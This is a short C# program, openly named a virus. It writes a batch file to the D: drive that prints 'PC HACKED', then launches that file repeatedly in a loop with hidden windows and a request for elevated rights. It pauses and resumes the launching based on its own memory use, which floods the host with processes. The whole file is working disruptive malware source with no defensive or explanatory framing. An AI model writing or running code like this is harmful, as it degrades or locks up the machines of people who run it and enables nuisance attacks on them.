using System;
using System.Diagnostics;
using System.IO;

namespace virus
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string path = @"D:\biit_virus.bat";
                FileStream fs = File.Create(path);
                fs.Close();
                using (StreamWriter sw = File.AppendText(path))
                {
                    sw.WriteLine("ECHO PC HACKED");
                    sw.WriteLine("timeout /t 5 /nobreak");
                }
                bool run = true;
                runVirus:
                while (true)
                {
                    if (run)
                    { 
                        ProcessStartInfo si = new ProcessStartInfo();
                        si.CreateNoWindow = true;
                        si.FileName = @"D:\biit_virus.bat";
                        si.Verb = "runas";
                        si.UseShellExecute = false;
                        Process.Start(si);
                    }
                    Process currentProcess = Process.GetCurrentProcess();
                    long usedMemory = currentProcess.PrivateMemorySize64;
                    Console.WriteLine(usedMemory);
                    if (usedMemory > 13430784) {
                        run = false;
                        break;
                    }
                }
                while (true)
                {
                    Process currentProcess = Process.GetCurrentProcess();
                    long usedMemory = currentProcess.PrivateMemorySize64;
                    Console.WriteLine(usedMemory);
                    if (usedMemory < 12664832)
                    {
                        goto runVirus;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
